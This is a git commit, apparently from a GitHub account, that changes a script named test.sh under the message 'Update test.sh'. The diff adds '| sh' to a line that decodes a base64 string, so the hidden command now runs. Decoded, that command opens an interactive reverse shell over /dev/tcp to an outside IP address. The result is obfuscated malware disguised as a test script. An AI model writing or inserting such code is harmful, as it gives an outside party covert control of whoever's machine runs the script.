083566e2d994366ff4b1dc520c50e19ee7c4005d
dewtestdew <93382436+dewtestdew@users.noreply.github.com>
2026-09-17 16:33:05 +0300

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,3 +1,3 @@
 #!/bin/sh
 
-echo 'L2Jpbi9zaCAtYyAiL2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC82Mi44NC4xMjIuMTUwLzg0NDMgMD4mMSI=' | base64 -d 
+echo 'L2Jpbi9zaCAtYyAiL2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC82Mi44NC4xMjIuMTUwLzg0NDMgMD4mMSI=' | base64 -d | sh
